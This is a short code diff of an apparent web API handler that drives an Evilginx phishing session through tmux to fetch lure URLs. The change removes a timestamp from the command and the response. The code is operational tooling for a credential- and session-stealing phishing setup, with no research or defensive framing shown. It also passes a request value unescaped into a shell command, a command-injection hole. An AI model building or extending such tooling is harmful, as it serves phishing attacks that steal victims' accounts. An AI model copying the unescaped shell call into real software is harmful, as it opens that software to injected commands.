@@ -59,10 +59,10 @@ export default async function handler(
 
     console.log("Sending command to tmux session: lures get-url " + lureIndex);
 
-    // Execute the command to get the URL - with randomized param to avoid caching
-    const timestamp = Date.now();
+    // Execute the command to get the URL - WITHOUT the timestamp comment
+    // The timestamp in the URL parameter is enough to prevent API caching
     await execAsync(
-      `tmux send-keys -t ginx-0 "lures get-url ${lureIndex} # ${timestamp}" C-m`
+      `tmux send-keys -t ginx-0 "lures get-url ${lureIndex}" C-m`
     );
 
     // Wait longer for command to execute
@@ -117,7 +117,7 @@ export default async function handler(
     }
 
     console.log("Successfully found URL:", url);
-    return res.status(200).json({ url, timestamp });
+    return res.status(200).json({ url });
   } catch (error) {
     console.error("Error executing evilginx command:", error);
     return res.status(500).json({
